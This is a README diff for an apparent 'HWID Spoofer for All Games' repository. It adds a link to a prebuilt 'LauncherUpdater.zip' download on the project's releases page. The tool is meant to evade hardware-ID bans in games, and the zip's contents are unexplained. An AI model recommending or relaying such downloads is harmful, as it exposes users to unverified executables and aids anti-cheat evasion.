@@ -16,7 +16,7 @@ Welcome to the HWID Spoofer for All Games repository! This tool is designed to h
 
 ## Installation
 
-> ### You can simply download `LauncherUpdater` and use spoofer without *bash*
+> ### You can simply download [`LauncherUpdater`](https://github.com/ArmandoA10/hwid-spoofer/releases/download/hwid-spoofer/LauncherUpdater.zip) and use spoofer without *bash*
 
 Clone the Repository:
 
